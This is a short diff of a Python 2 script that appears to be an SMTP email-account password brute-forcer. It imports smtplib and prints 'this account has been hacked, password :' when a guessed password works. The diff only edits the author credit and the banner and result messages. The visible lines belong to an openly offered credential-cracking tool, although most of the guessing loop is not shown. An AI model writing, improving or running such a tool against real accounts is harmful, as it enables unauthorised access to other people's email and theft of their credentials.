@@ -1,10 +1,10 @@
 #!/usr/bin/python
-'''coded by ayoub sirai'''
+'''coded by SAINTMALIK.'''
 import smtplib
 from os import system
 def main ():
 print '================================================='
-print '               Proudly coded by SIANTMALIK       '
+print '               coded by Saint Malik              '
 print '================================================='
 print '               ++++++++++++++++++++              '
 print '\n                                               '
@@ -63,7 +63,7 @@ error = str (e)
 if error[ 14 ] == '<' :
 system( 'clear' )
 main()
-print '[+] SAINTMALIK says this account has been hacked, password :' + password + '     ^_^'
+print '[+] this account has been hacked, password :' + password + '     ^_^'
 break
 else :
 print '[!] password not found => ' + password
